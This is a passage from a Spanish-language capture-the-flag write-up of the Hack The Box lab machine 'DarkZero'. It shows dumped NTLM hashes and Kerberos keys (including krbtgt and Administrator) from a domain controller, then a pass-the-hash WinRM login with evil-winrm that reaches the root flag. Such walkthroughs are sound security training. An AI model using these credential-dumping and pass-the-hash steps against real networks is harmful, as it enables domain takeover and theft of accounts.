Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:4855ae0f61a2647b25f54b7bddd86b2b:::
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
krbtgt:aes256-cts-hmac-sha1-96:6330aee12ac37e9c42bc9af3f1fec55d7755c31d70095ca1927458d216884d41
krbtgt:aes128-cts-hmac-sha1-96:0ffbe626519980a499cb85b30e0b80f3
krbtgt:0x17:64f4771e4c60b8b176c3769300f6f3f7
john.w:0x14:f6d74915f051ef9c1c085d31f02698c04a4c6804d509b7c4442e8593d6d957ea
john.w:0x13:7b145a89aed458eaea530a2bd1eb93bd
john.w:aes256-cts-hmac-sha1-96:49a6d3404e9d19859c0eea1036f6e95debbdea99efea4e2c11ee529add37717e
john.w:aes128-cts-hmac-sha1-96:87d9cbd84d85c50904eba39d588e47db
john.w:0x17:44b1b5623a1446b5831a7b3a4be3977b
DC01$:aes256-cts-hmac-sha1-96:25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941
DC01$:aes128-cts-hmac-sha1-96:9996363bffe713a6777597c876d4f9db
DC01$:0x17:d02e3fe0986e9b5f013dad12b2350b3a
darkzero-ext$:aes256-cts-hmac-sha1-96:fa3677efec38dcb1bc1db28f56680001d3ed9407277bd3fb6fc6349236cc0b10
darkzero-ext$:aes128-cts-hmac-sha1-96:918c7e206515578965600af3861f0905
darkzero-ext$:0x17:4855ae0f61a2647b25f54b7bddd86b2b
[*] Cleaning up... 
```

Accedemos a través de WinRM a **DC01** con el hash de **Administrator** (`:5917507bdf2ef2c2b0a869a1cba40726`) y con esto habremos obtenido ya la root flag:

```bash
evil-winrm.py -hashes :5917507bdf2ef2c2b0a869a1cba40726 'darkzero.htb/Administrator@10.129.7.205'

'prompt_toolkit' not installed, using built-in 'readline'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using 10.129.7.205
[*] '-port' not specified, using 5985
[*] '-url' not specified, using http://10.129.7.205:5985/wsman
PS C:\Users\Administrator\Documents> cd ..
PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---         3/16/2026   2:44 PM             34 root.txt                                                              
-ar---         3/16/2026   2:44 PM             34 user.txt      
```